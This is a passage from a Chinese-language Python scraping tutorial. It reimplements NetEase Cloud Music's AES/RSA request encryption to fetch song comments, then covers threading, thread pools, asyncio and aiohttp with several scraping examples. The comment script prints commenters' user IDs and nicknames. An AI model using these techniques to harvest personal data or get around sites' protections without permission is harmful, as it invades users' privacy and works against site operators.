&quot;22a74d1b88ff43db4091&quot;def get_params(data):  # 默认收到的是字符串    first = enc_params(data, g)    second = enc_params(first, i)    return second  # 返回的就是paramsdef to_16(data):    pad = 16 - len(data) % 16    data += chr(pad) * pad# 加密过程def enc_params(data, key):    iv = &quot;0102030405060708&quot;    aes = AES.new(key=key.encode(&#x27;utf-8&#x27;), IV=iv.encode(&#x27;utf-8&#x27;), mode=AES.MODE_CBC)  # 创建加密器    data = to_16(data)    bs = aes.encrypt(data)  # 加密，得到字节,加密的长度必须是16的倍数 &quot;123456789abcdfgh chr(16)&quot;    return str(b64encode(bs), &quot;utf-8&quot;)  # 转化成字符串resp = requests.post(url, data=&#123;    &quot;params&quot;: get_params(json.dumps(data)),    &quot;encSecKey&quot;: get_encSeckey()&#125;)print(resp.text)# 处理加密过程&quot;&quot;&quot;function a(a = 16) &#123;        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;        for (d = 0; a &gt; d; d += 1) # 循环16次            e = Math.random() * b.length, # 随机数，假如是 1.2345            e = Math.floor(e), # 取整 ，假设下会变为 1            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b        return c #产生随机的16位字符串    &#125;    function b(a, b) &#123; # a是要加密的内容        var c = CryptoJS.enc.Utf8.parse(b) # b是密钥          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)          , e = CryptoJS.enc.Utf8.parse(a) # e是数据          , f = CryptoJS.AES.encrypt(e, c, &#123;   # c是加密的密钥            iv: d, # 偏移量            mode: CryptoJS.mode.CBC #CBC模式加密        &#125;);        return f.toString()    &#125;    function c(a, b, c) &#123;   #c不产生随机数        var d, e;        return setMaxDigits(131),        d = new RSAKeyPair(b,&quot;&quot;,c),        e = encryptedString(d, a)    &#125;d:数据e:010001f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;g:&#x27;0CoJUm6Qyw8W8jud&#x27;    function d(d, e, f, g) &#123;        var h = &#123;&#125; #h现在是空对象          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值        return h.encText = b(d, g), # g就是密钥        h.encText = b(h.encText, i),  #返回的就是params,流程是：数据+g =&gt; b() =&gt; 第一次加密+i =&gt; b() =&gt; params , i也是密钥        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了        h    &#125;    function e(a, b, d, e) &#123;        var f = &#123;&#125;;        return f.encText = c(a + e, b, d),        f    &#125;&quot;&quot;&quot;\n\n\n​    还报错，原来是字节的问题，转换成utf-8\n# 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)# 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey# 3.请求到网易，拿到评论信息import requestsfrom Crypto.Cipher import AESfrom base64 import b64encodeimport jsonurl = &quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;# 请求方式是post,拿真实参数data = &#123;    &quot;csrf_token&quot;: &quot;&quot;,    &quot;cursor&quot;: &quot;-1&quot;,    &quot;offset&quot;: &quot;0&quot;,    &quot;orderType&quot;: &quot;1&quot;,    &quot;pageNo&quot;: &quot;1&quot;,    &quot;pageSize&quot;: &quot;20&quot;,    &quot;rid&quot;: &quot;R_SO_4_1474411443&quot;,    &quot;threadId&quot;: &quot;R_SO_4_1474411443&quot;&#125;f = &quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot; \\    &quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot; \\    &quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot; \\    &quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;g = &quot;0CoJUm6Qyw8W8jud&quot;e = &quot;010001&quot;i = &quot;jVQn8x1vCuwKtrdO&quot;def get_encSeckey():    return &quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c&quot; \\           &quot;30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab0457&quot; \\           &quot;22b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40&quot; \\           &quot;865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc3&quot; \\           &quot;22a74d1b88ff43db4091&quot;def get_params(data):  # 默认收到的是字符串    first = enc_params(data, g)    second = enc_params(first, i)    return second  # 返回的就是paramsdef to_16(data):    pad = 16 - len(data) % 16    data += chr(pad) * pad    return data# 加密过程def enc_params(data, key):    iv = &quot;0102030405060708&quot;    data = to_16(data)    aes = AES.new(key=key.encode(&#x27;utf-8&#x27;), IV=iv.encode(&#x27;utf-8&#x27;), mode=AES.MODE_CBC)  # 创建加密器    bs = aes.encrypt(data.encode(&#x27;utf-8&#x27;))  # 加密，得到字节,加密的长度必须是16的倍数 &quot;123456789abcdfgh chr(16)&quot;    return str(b64encode(bs), &quot;utf-8&quot;)  # 转化成字符串resp = requests.post(url, data=&#123;    &quot;params&quot;: get_params(json.dumps(data)),    &quot;encSecKey&quot;: get_encSeckey()&#125;)print(resp.text)# 处理加密过程&quot;&quot;&quot;function a(a = 16) &#123;        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;        for (d = 0; a &gt; d; d += 1) # 循环16次            e = Math.random() * b.length, # 随机数，假如是 1.2345            e = Math.floor(e), # 取整 ，假设下会变为 1            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b        return c #产生随机的16位字符串    &#125;    function b(a, b) &#123; # a是要加密的内容        var c = CryptoJS.enc.Utf8.parse(b) # b是密钥          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)          , e = CryptoJS.enc.Utf8.parse(a) # e是数据          , f = CryptoJS.AES.encrypt(e, c, &#123;   # c是加密的密钥            iv: d, # 偏移量            mode: CryptoJS.mode.CBC #CBC模式加密        &#125;);        return f.toString()    &#125;    function c(a, b, c) &#123;   #c不产生随机数        var d, e;        return setMaxDigits(131),        d = new RSAKeyPair(b,&quot;&quot;,c),        e = encryptedString(d, a)    &#125;d:数据e:010001f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;g:&#x27;0CoJUm6Qyw8W8jud&#x27;    function d(d, e, f, g) &#123;        var h = &#123;&#125; #h现在是空对象          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值        return h.encText = b(d, g), # g就是密钥        h.encText = b(h.encText, i),  #返回的就是params,流程是：数据+g =&gt; b() =&gt; 第一次加密+i =&gt; b() =&gt; params , i也是密钥        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了        h    &#125;    function e(a, b, d, e) &#123;        var f = &#123;&#125;;        return f.encText = c(a + e, b, d),        f    &#125;&quot;&quot;&quot;\n\n​    总算是拿到了王心凌的评论🥵\n\n# 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)# 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey# 3.请求到网易，拿到评论信息import requestsfrom Crypto.Cipher import AESfrom base64 import b64encodeimport jsonurl = &quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;# 请求方式是post,拿真实参数data = &#123;    &quot;csrf_token&quot;: &quot;&quot;,    &quot;cursor&quot;: &quot;-1&quot;,    &quot;offset&quot;: &quot;0&quot;,    &quot;orderType&quot;: &quot;1&quot;,    &quot;pageNo&quot;: &quot;1&quot;,    &quot;pageSize&quot;: &quot;20&quot;,    &quot;rid&quot;: &quot;R_SO_4_1474411443&quot;,    &quot;threadId&quot;: &quot;R_SO_4_1474411443&quot;&#125;f = &quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot; \\    &quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot; \\    &quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot; \\    &quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;g = &quot;0CoJUm6Qyw8W8jud&quot;e = &quot;010001&quot;i = &quot;jVQn8x1vCuwKtrdO&quot;def get_encSeckey():    return &quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c&quot; \\           &quot;30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab0457&quot; \\           &quot;22b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40&quot; \\           &quot;865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc3&quot; \\           &quot;22a74d1b88ff43db4091&quot;def get_params(data):  # 默认收到的是字符串    first = enc_params(data, g)    second = enc_params(first, i)    return second  # 返回的就是paramsdef to_16(data):    pad = 16 - len(data) % 16    data += chr(pad) * pad    return data# 加密过程def enc_params(data, key):    iv = &quot;0102030405060708&quot;    data = to_16(data)    aes = AES.new(key=key.encode(&#x27;utf-8&#x27;), IV=iv.encode(&#x27;utf-8&#x27;), mode=AES.MODE_CBC)  # 创建加密器    bs = aes.encrypt(data.encode(&#x27;utf-8&#x27;))  # 加密，得到字节,加密的长度必须是16的倍数 &quot;123456789abcdfgh chr(16)&quot;    return str(b64encode(bs), &quot;utf-8&quot;)  # 转化成字符串resp = requests.post(url, data=&#123;    &quot;params&quot;: get_params(json.dumps(data)),    &quot;encSecKey&quot;: get_encSeckey()&#125;)dic = resp.json()for i in range(10,100):    user = dic[&#x27;data&#x27;][&#x27;comments&#x27;][i][&#x27;beReplied&#x27;]    userId = user[0][&#x27;user&#x27;][&#x27;userId&#x27;]    nickname = user[0][&#x27;user&#x27;][&#x27;nickname&#x27;]    comment = user[0][&#x27;content&#x27;]    # nickname = dic[&#x27;data&#x27;][&#x27;comments&#x27;][6][&#x27;beReplied&#x27;][0][&#x27;nickname&#x27;]    # comment = dic[&#x27;data&#x27;][&#x27;comments&#x27;][6][&#x27;beReplied&#x27;][&#x27;content&#x27;]    print(&quot;用户ID：&quot; + str(userId) + &quot;   用户名：&quot; + nickname + &quot;   评论内容：&quot; + comment)# 处理加密过程&quot;&quot;&quot;function a(a = 16) &#123;        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;        for (d = 0; a &gt; d; d += 1) # 循环16次            e = Math.random() * b.length, # 随机数，假如是 1.2345            e = Math.floor(e), # 取整 ，假设下会变为 1            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b        return c #产生随机的16位字符串    &#125;    function b(a, b) &#123; # a是要加密的内容        var c = CryptoJS.enc.Utf8.parse(b) # b是密钥          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)          , e = CryptoJS.enc.Utf8.parse(a) # e是数据          , f = CryptoJS.AES.encrypt(e, c, &#123;   # c是加密的密钥            iv: d, # 偏移量            mode: CryptoJS.mode.CBC #CBC模式加密        &#125;);        return f.toString()    &#125;    function c(a, b, c) &#123;   #c不产生随机数        var d, e;        return setMaxDigits(131),        d = new RSAKeyPair(b,&quot;&quot;,c),        e = encryptedString(d, a)    &#125;d:数据e:010001f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;g:&#x27;0CoJUm6Qyw8W8jud&#x27;    function d(d, e, f, g) &#123;        var h = &#123;&#125; #h现在是空对象          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值        return h.encText = b(d, g), # g就是密钥        h.encText = b(h.encText, i),  #返回的就是params,流程是：数据+g =&gt; b() =&gt; 第一次加密+i =&gt; b() =&gt; params , i也是密钥        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了        h    &#125;    function e(a, b, d, e) &#123;        var f = &#123;&#125;;        return f.encText = c(a + e, b, d),        f    &#125;&quot;&quot;&quot;\n\n\n​    评论还是挺逆天的。\n\n四概述​    可以解决爬⾍的基本抓取流程了. 但是抓取效率还是不够⾼. 可以选择多线程, 多进程, 协程等操作完成异步爬⾍. 这⾥我们不讨论蹩脚的概念性问题. 直接说效果. 打个⽐⽅, 我们⽬前写的爬⾍可以理解为单线程, ⽐喻为单⻋道公路. 如何提⾼效率呢? 很简单, 搞成多⻋道就OK了啊. 异步爬⾍你就可以 理解为多⻋道同时进⾏爬取.\n\n​    在这⾥要特殊说明⼀下. 多线程异步爬⾍中每⼀步都可以设⽴成多线 程的. 具体操作得实际去分析. 当然, 也可以像我画图这样, 每⼀个url ⼀个单独线程. 还是那句话. 技术是死的. ⼈是活的. 怎么⼲还得看自己\n多线程​    进程是一个资源单位，线程是一个执行单位。每一个进程至少要有一个线程\ndef func():    for i in range(1000):        print(&quot;func&quot;, i)# 启动每一个程序默认都会有一个主线程if __name__ == &#x27;__main__&#x27;:    func()    for i in range(1000):        print(&quot;main&quot;, i)\n\n\n​    现在这是一个单线程，下面实现一个多线程\n# def func():#     for i in range(1000):#         print(&quot;func&quot;, i)### # 启动每一个程序默认都会有一个主线程# if __name__ == &#x27;__main__&#x27;:#     func()#     for i in range(1000):#         print(&quot;main&quot;, i)# 多线程from threading import Threaddef func():    for i in range(1000):        print(&quot;func&quot;, i)if __name__ == &#x27;__main__&#x27;:    t = Thread(target=func)  # 给线程安排任务,注意这里没括号    t.start()  # 多线程状态可以开始为工作状态，具体的执行时间由CPU决定    for i in range(1000):        print(&quot;main&quot;, i)\n\n\n​    注意上面是没有括号的，加括号是对函数执行结果的调用，不加括号是对函数的调用\n​    另一种写法，覆写run方法，和java挺像这里，不懂的可以去看我的java文章\n# def func():#     for i in range(1000):#         print(&quot;func&quot;, i)### # 启动每一个程序默认都会有一个主线程# if __name__ == &#x27;__main__&#x27;:#     func()#     for i in range(1000):#         print(&quot;main&quot;, i)# # 多线程# from threading import Thread### def func():#     for i in range(1000):#         print(&quot;func&quot;, i)### if __name__ == &#x27;__main__&#x27;:#     t = Thread(target=func)  # 给线程安排任务,注意这里没括号#     t.start()  # 多线程状态可以开始为工作状态，具体的执行时间由CPU决定#     for i in range(1000):#         print(&quot;main&quot;, i)# 另一种写法from threading import Threadclass MyThread(Thread):    def run(self):        for i in range(1000):            print(&quot;子线程&quot;, i)if __name__ == &#x27;__main__&#x27;:    t = MyThread()    t.start()    for i in range(1000):        print(&quot;主线程&quot;, i)\n\n\n多进程​    用的比较少，开进程消耗资源比较多\nfrom multiprocessing import Processdef func():    for i in range(1000000):        print(&quot;子进程&quot;, i)if __name__ == &#x27;__main__&#x27;:    p = Process(target=func)    p.start()    for i in range(1000000):        print(&quot;主进程&quot;, i)\n\n\n​    那么有时候我们需要给函数传参数，可以这么实现\nfrom threading import Threaddef func(name):    for i in range(100):        print(name, i)if __name__ == &#x27;__main__&#x27;:    t1 = Thread(target=func, args=(&quot;周杰伦&quot;,))  # 必须是元组    t2 = Thread(target=func, args=(&quot;王⼒宏&quot;,))    t1.start()    t2.start()\n\n\n线程池和进程池​    发现这⽹站的数据太多了. 有⼀万多⻚. 也就对应着 ⼀万多个url. 那我们设计多线程的时候如果每个url对应⼀个线程就 会产⽣新问题. 朋友, 你⼀定要知道. 创建线程本身也是要消耗你的计 算机资源的. 线程不是变魔术变出来的. 那这时我们就可以考虑能不 能重复的使⽤线程呢? 答案当然可以. 线程池就可以帮你搞定.\n​    线程池⼯作原理: 创建⼀个⼤池⼦, 存放固定数量的线程. 然后把我们要执⾏的任务丢给线程池. 由线程池去分配哪个线程来完成该任务. 其他的事情都不需要管.\nfrom concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutordef fn(name):    for i in range(1000):        print(name, i)if __name__ == &#x27;__main__&#x27;:    # 创建线程池    with ThreadPoolExecutor(50) as t:        for i in range(100):            t.submit(fn, name=f&quot;线程&#123;i&#125;&quot;)    # 等待线程池中的任务全部执行完毕，才继续执行（守护）    print(&quot;123&quot;)\n\n线程池案例_搞搞菜价​    线程池一般思路：\n​    1、如何提取单个页面的数据\n​    2、上线程池，多个页面同时抓取\n\n​    这个效率非常低下\nimport csvfrom concurrent.futures import ThreadPoolExecutorimport requestsurl = &quot;http://www.xinfadi.com.cn/getPriceData.html&quot;headers = &#123;    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;                  &quot;Chrome/104.0.0.0 Safari/537.36 &quot;&#125;f = open(&quot;data.csv&quot;, mode=&quot;w&quot;, encoding=&quot;utf-8&quot;)csvwriter = csv.writer(f)list1 = []def download_all_page(url):    for i in range(18157):  # 效率非常低下        data = f&quot;limit=20&amp;current=&#123;i&#125;&amp;pubDateStartTime=&amp;pubDateEndTime=&amp;prodPcatid=&amp;prodCatid=&amp;prodName=&quot;        resp = requests.post(url, data=data, headers=headers)        respdata = resp.json()[&quot;list&quot;]        # print(respdata)        for i in range(20):            onedata = respdata[i].items()            list1 = list(onedata)            print(list1)            csvwriter.writerow(list1)        print(url + data, &quot;提取完毕!&quot;)if __name__ == &#x27;__main__&#x27;:    download_all_page(url)\n\n​    这里出现了一些小问题，知道思路好了，就不搞了，在改版前抓取的代码是这样的\nfrom concurrent.futures import ThreadPoolExecutorimport csvimport requestsfrom lxml import etree# ⼲掉新发地def download(url):\tresp = requests.get(url)\thtml = etree.HTML(resp.text)\ttable =html.xpath(&quot;/html/body/div[2]/div[4]/div[1]/table&quot;)[0]\ttrs = table.xpath(&quot;./tr[position()&gt;1]&quot;)\tfor tr in trs: \t\ttr_text = tr.xpath(&quot;./td/child::text()&quot;) \t\ttr_text = (item.replace(&quot;\\\\&quot;,&quot;&quot;).replace(&quot;/&quot;, &quot;&quot;) for item in tr_text)\t\tcsv_writer.writerow(tr_text) \treturn urlif __name__ == &#x27;__main__&#x27;: \tcsv_writer = csv.writer(open(&quot;菜价.csv&quot;,mode=&quot;w&quot;)) \twith ThreadPoolExecutor(50) as t: \t\tfor i in range(1, 100): # 别弄太狠. 不好\t\t\turl_temp = f&quot;http://www.xinfadi.com.cn/marketanalysis/0/list/&#123;i&#125;.shtml&quot; \t\tt.submit(fn=download, url=url_temp)\tprint(&quot;all down!&quot;)\n\n协程​    协程是我要重点去讲解的⼀个知识点. 它能够更加⾼效的利⽤CPU. \n​    其实, 我们能够⾼效的利⽤多线程来完成爬⾍其实已经很6了. 但是, 从某种⻆度讲, 线程的执⾏效率真的就⽆敌了么? 我们真的充分的利⽤CPU资源了么? \n​    ⾮也~ ⽐如, 我们来看下⾯这个例⼦. 我们单独的⽤⼀个线程来完成某⼀个操作. 看看它的效率是否真的能 把CPU完全利⽤起来\nimport timedef func():    print(&quot;我爱黎明&quot;)    time.sleep(3)    print(&quot;我真的爱黎明&quot;)if __name__ == &#x27;__main__&#x27;:    func()\n\n​    在该程序中, 我们的func()实际在执⾏的时候⾄少需要3秒的时间来完成操作. 中间的三秒钟需要让我当前的线程处于阻塞状态. 阻塞状态的线程 CPU是不会来执⾏你的. 那么此时cpu很可能会切换到其他程序上去执⾏. 此时, 对于你来说, CPU其实并没有为你 ⼯作(在这三秒内), 那么我们能不能通过某种⼿段, 让CPU⼀直为我⽽⼯作. 尽量的不要去管其他⼈. \n​    我们要知道CPU⼀般抛开执⾏周期不谈, 如果⼀个线程遇到了IO操作, CPU就会⾃动的切换到其他线程进⾏执⾏. 那么, 如果我想办法让我的线程遇到了IO操作就挂起, 留下的都是运算操作. 那CPU是不是就会⻓时间的来照顾我. \n​    以此为⽬的, 伟⼤的程序员就发明了⼀个新的执⾏过程. 协程：当线程中遇到了IO操作的时候, 将线程中的任务进⾏切换, 切换成⾮ IO操作. 等原来的IO执⾏完了. 再恢复回原来的任务中.\n\n​    就形成了这样⼀种模型, 在程序遇到了IO操作(费时不费⼒的操作)时, ⾃动切换到其他任务. 该模型被称为协程. \n​    协程：当程序遇见了I0操作的时候，可以选择性的切换到其他任务上，在微观上是一个任务一个任务的进行切换．切换条件一般就是I0操作。在宏观上，我们能看到的其实是多个任务一起在执行，也就是一个多任务异步操作。不过这些所讲的一切都是在单线程条件下。\n​        协程的基本写法: 咱就介绍⼀种, 也是最好⽤的⼀种, 如果各位想看更加详细, 细致的协程推导过程。\n# 协程：当程序遇见了I0操作的时候，可以选择性的切换到其他任务上，# 在微观上是一个任务一个任务的进行切换．切换条件一般就是I0操作# 在宏观上，我们能看到的其实是多个任务一起在执行# 多任务异步操作import asyncioasync def func():    print(&quot;你好啊，我叫赛利亚&quot;)if __name__ == &#x27;__main__&#x27;:    g = func()  # 此时的函数是异步协程函数，此时函数执行得到的是一个协程对象    # print(g)    asyncio.run(g)  # 协程程序运行霜要asyncio模块的支持\n\n​    此时是并不会比原来快的，我们重新建一个任务\n# 协程：当程序遇见了I0操作的时候，可以选择性的切换到其他任务上，# 在微观上是一个任务一个任务的进行切换．切换条件一般就是I0操作# 在宏观上，我们能看到的其实是多个任务一起在执行# 多任务异步操作import asyncioimport timeasync def func1():    print(&quot;你好啊，我是mes9s0&quot;)    time.sleep(3)    print(&quot;你好啊，我是mes9s0&quot;)async def func2():    print(&quot;你好啊，我是王建国&quot;)    time.sleep(2)    print(&quot;你好啊，我是王建国&quot;)async def func3():    print(&quot;你好啊，我是李雪琴&quot;)    time.sleep(4)    print(&quot;你好啊，我是李雪琴&quot;)if __name__ == &#x27;__main__&#x27;:    f1 = func1()    f2 = func2()    f3 = func3()    tasks = [        f1, f2, f3    ]    t1 = time.time()  # 记录时间    # 一次启动多个任务(协程)    asyncio.run(asyncio.wait(tasks))    t2 = time.time()    print(t2 - t1)\n\n\n​    这会疑问了，我们明明是异步操作，却还是9s多，这是因为当程序出现了同步操作的时候，异步就中断了。我们这么修改下\n# 协程：当程序遇见了I0操作的时候，可以选择性的切换到其他任务上，# 在微观上是一个任务一个任务的进行切换．切换条件一般就是I0操作# 在宏观上，我们能看到的其实是多个任务一起在执行# 多任务异步操作import asyncioimport timeasync def func1():    print(&quot;你好啊，我是mes9s0&quot;)    # time.sleep(3)  # 当程序出现了同步操作的时候，异步就中断了    await asyncio.sleep(3)  # 异步操作的代码    print(&quot;你好啊，我是mes9s0&quot;)async def func2():    print(&quot;你好啊，我是王建国&quot;)    # time.sleep(2)    await asyncio.sleep(2)  # 异步操作的代码    print(&quot;你好啊，我是王建国&quot;)async def func3():    print(&quot;你好啊，我是李雪琴&quot;)    # time.sleep(4)    await asyncio.sleep(4)  # 异步操作的代码    print(&quot;你好啊，我是李雪琴&quot;)if __name__ == &#x27;__main__&#x27;:    f1 = func1()    f2 = func2()    f3 = func3()    tasks = [        f1, f2, f3    ]    t1 = time.time()  # 记录时间    # 一次启动多个任务(协程)    asyncio.run(asyncio.wait(tasks))    t2 = time.time()    print(t2 - t1)\n\n\n​    这只是一种直观的观察方式，平时我们不这么写代码，我们再修改下\nimport asyncioimport timeasync def func1():    print(&quot;你好啊，我是mes9s0&quot;)    await asyncio.sleep(3)  # 异步操作的代码    print(&quot;你好啊，我是mes9s0&quot;)async def func2():    print(&quot;你好啊，我是王建国&quot;)    await asyncio.sleep(2)  # 异步操作的代码    print(&quot;你好啊，我是王建国&quot;)async def func3():    print(&quot;你好啊，我是李雪琴&quot;)    await asyncio.sleep(4)  # 异步操作的代码    print(&quot;你好啊，我是李雪琴&quot;)async def main():    # 写法一 , 不推荐    # f1 = func1()    # await f1  # 一般await挂起操作放在协程对象前面    # 写法二    tasks = [        func1(),        func2(),        func3()    ]    await asyncio.wait(tasks)if __name__ == &#x27;__main__&#x27;:    t1 = time.time()    asyncio.run(main())    t2 = time.time()    print(t2 - t1)\n\n​    下面提供一个模版，注意只是演示：\nimport asyncioasync def download(url):    print(&quot;准备开始下载&quot;)    await asyncio.sleep(2)  # 模拟网络请求    print(&quot;下载完成&quot;)async def main():    urls = [        &quot;http://www.baidu.com&quot;,        &quot;http://www.bilibili.com&quot;,        &quot;http://www.163.com&quot;    ]    tasks = []    for url in urls:        d = download(url)        tasks.append(d)    await asyncio.wait(tasks)if __name__ == &#x27;__main__&#x27;:    asyncio.run(main())\n\n​    注意，3.8可能会报一个警告。在后续的写法里我们需要吧对象包装成协程对象就可以\n# # 协程：当程序遇见了I0操作的时候，可以选择性的切换到其他任务上，# # 在微观上是一个任务一个任务的进行切换．切换条件一般就是I0操作# # 在宏观上，我们能看到的其实是多个任务一起在执行# # 多任务异步操作# import asyncio# import time### async def func1():#     print(&quot;你好啊，我是mes9s0&quot;)#     # time.sleep(3)  # 当程序出现了同步操作的时候，异步就中断了#     await asyncio.sleep(3)  # 异步操作的代码#     print(&quot;你好啊，我是mes9s0&quot;)### async def func2():#     print(&quot;你好啊，我是王建国&quot;)#     # time.sleep(2)#     await asyncio.sleep(2)  # 异步操作的代码#     print(&quot;你好啊，我是王建国&quot;)### async def func3():#     print(&quot;你好啊，我是李雪琴&quot;)#     # time.sleep(4)#     await asyncio.sleep(4)  # 异步操作的代码#     print(&quot;你好啊，我是李雪琴&quot;)### if __name__ == &#x27;__main__&#x27;:#     f1 = func1()#     f2 = func2()#     f3 = func3()#     tasks = [#         f1, f2, f3#     ]#     t1 = time.time()  # 记录时间#     # 一次启动多个任务(协程)#     asyncio.run(asyncio.wait(tasks))#     t2 = time.time()#     print(t2 - t1)import asyncioimport timeasync def func1():    print(&quot;你好啊，我是mes9s0&quot;)    await asyncio.sleep(3)  # 异步操作的代码    print(&quot;你好啊，我是mes9s0&quot;)async def func2():    print(&quot;你好啊，我是王建国&quot;)    await asyncio.sleep(2)  # 异步操作的代码    print(&quot;你好啊，我是王建国&quot;)async def func3():    print(&quot;你好啊，我是李雪琴&quot;)    await asyncio.sleep(4)  # 异步操作的代码    print(&quot;你好啊，我是李雪琴&quot;)async def main():    # 写法一 , 不推荐    # f1 = func1()    # await f1  # 一般await挂起操作放在协程对象前面    # 写法二    tasks = [        asyncio.create_task(func1()),        asyncio.create_task(func2()),        asyncio.create_task(func3())    ]    await asyncio.wait(tasks)if __name__ == &#x27;__main__&#x27;:    t1 = time.time()    asyncio.run(main())    t2 = time.time()    print(t2 - t1)\n\n异步http请求aiohttp模块​    aiohttp是python的⼀个⾮常优秀的第三⽅异步http请求库. 我们可以 ⽤aiohttp来编写异步爬⾍(协程).\n​    写一个试一下：\n# requests.get()同步的代码 -&gt; 异步操作aiohttpimport asyncioimport aiohttpurls = [    &quot;https://www.umei.cc/d/file/20220919/d39ee6d21a61bac1ca1837c8e64015ab.jpg&quot;,    &quot;https://www.umei.cc/d/file/20220919/3ccb2fe3793d9eb05e5aac78d21fc136.jpg&quot;,    &quot;https://www.umei.cc/d/file/20220919/34e157502386c3abfadf159c717cc393.jpg&quot;]async def aiodownload(url):    # s = aiohttp.ClientSession() &lt;==&gt; requests.session()    # requests.get()   .post()    # s.get()    .post()    # 发送请求    # 得到图片内容    # 保存文件    # 加with的作用是不用关链接了    name = url.rsplit(&quot;/&quot;, 1)[1]  # 从右边切，切一次，得到[1]位置的内容    async with aiohttp.ClientSession() as session:  # requests        async with session.get(url) as resp:  # resp = requests.get()            # 请求回来了，写入文件            with open(name, mode=&quot;wb&quot;) as f:                f.write(await resp.content.read())  # 读取内容异步的，需要await挂起    print(&quot;搞定&quot;)async def main():    tasks = []    for url in urls:        tasks.append(aiodownload(url))    await asyncio.wait(tasks)if __name__ == &#x27;__main__&#x27;:    asyncio.run(main())\n\n异步爬虫扒光西游记​    分析网站得到一下几个url\n​    https://dushu.baidu.com/api/pc/getCatalog?data={&quot;book_id&quot;:&quot;4306063500&quot;} =&gt; 所有章节的内容(名称，cid)\n​    https://dushu.baidu.com/api/pc/getChapterContent?data={&quot;book_id&quot;:&quot;4306063500&quot;,&quot;cid&quot;:&quot;4306063500|1569782244&quot;,&quot;need_bookinfo&quot;:1} =&gt; 章节的内容\n​    分析一下，上面的url我们并不需要异步，而后面爬取网站的时候才需要。\n# https://dushu.baidu.com/api/pc/getCatalog?data=&#123;&quot;book_id&quot;:&quot;4306063500&quot;&#125; =&gt; 所有章节的内容(名称，cid)# 章节内部的内容# https://dushu.baidu.com/api/pc/getChapterContent?data=&#123;&quot;book_id&quot;:&quot;4306063500&quot;,&quot;cid&quot;:&quot;4306063500|1569782244&quot;,&quot;need_bookinfo&quot;:1&#125;import jsonimport aiofilesimport requestsimport asyncioimport aiohttp&quot;&quot;&quot;1. 同步操作：访问getCatalog 拿到所有章节的cid和名称2. 异步操作：访问getchapterContent 下载所有的文章内容&quot;&quot;&quot;async def aiodownload(cid, b_id, title):    data = &#123;        &quot;book_id&quot;: b_id,        &quot;cid&quot;: f&quot;&#123;b_id&#125;|&#123;cid&#125;&quot;,        